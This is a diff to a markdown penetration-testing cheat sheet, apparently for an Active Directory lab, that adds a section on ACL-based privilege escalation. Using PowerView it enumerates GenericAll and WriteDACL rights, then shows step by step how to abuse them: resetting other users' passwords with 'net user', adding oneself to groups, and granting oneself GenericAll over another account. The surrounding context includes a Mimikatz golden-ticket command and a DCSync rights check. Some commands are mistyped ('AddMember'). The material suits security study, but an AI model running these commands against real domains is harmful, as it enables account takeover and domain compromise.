@@ -405,7 +405,7 @@ Check Domain Admins permissions for a specific user:
 
 **Note:**  ```Where-Object```  ==  ``` ? ```
 
-DCSync: 
+Does user 'Mary' have access rights to perform DCSync: 
 
 ```Get-DomainObjectAcl -DistinguishedName "dc=bcorp,dc=ecorp,dc=lab" -ResolveGUIDs | ? {($_.IdentityReference -match "Mary") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}```
 
@@ -431,6 +431,75 @@ This appends the resolved user or group name to each ACE and recurses through:
 ```
 Get-DomainObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
 ```
+
+
+
+# Advanced ACL Enumeration
+
+#### Rights we care about:
+-GenericAll 
+-ForceChangePassword
+-AllExtendedRights
+-WriteDACL
+
+#### ACL Enumeration for a specific object
+Enumerate all ACLs for specific Identity/object:
+```
+Get-ObjectAcl -Identity <User123> -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
+```
+
+#### ACLs for current user:
+```
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+GenericAll access rights to an object such as a user, means we can do just about anything including change the password:
+
+```net user Bob Password01 /domain```
+
+#### ACLs for current group:
+```
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+likewise, if we have GenericAll access rights a group object, we can simply add ourselves to that group:
+
+```net group webadmins Bob /add /domain```
+
+#### WriteDACL
+
+ACL properties for specific object:
+
+```
+AceType : AccessAllowed
+ObjectDN : CN=Victor,OU=users,DC=ecorp,DC=lab
+ActiveDirectoryRights : ReadProperty, ..., WriteDacl```
+...
+Identity : ECORP\Bob
+```
+
+
+We have Write permissions to the Victor object, meaning we can change the ActiveDirectory rights to GenericAll in order to be able to change passwords and take control of the account like before:
+
+```Add-DomainObjectAcl -TargetIdentity Victor -PrincipalIdentity Bob -Rights All```
+
+
+Verify it worked:
+
+```
+Get-ObjectAcl -Identity <Victor> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+```
+AceType : AccessAllowed
+ObjectDN : CN=Victor,OU=users,DC=ecorp,DC=lab
+ActiveDirectoryRights : GenericAll```
+...
+Identity : ECORP\Bob
+```
+
+Now we have GenericAll we can change the password of Victor like before:
+```net user Victor Password01 /domain```
 
 * * * 
 
@@ -912,6 +981,9 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:child.pa
 * * *
 #### Transitive and Shortcut Trusts, Pepe Silvia, and Enterprise Admins. 
 https://www.youtube.com/watch?v=S5Glfe6UeXQ
+
+Enterprise Admin = Domain Admin of every Domain in the Forest
+
 
 
 * * * 
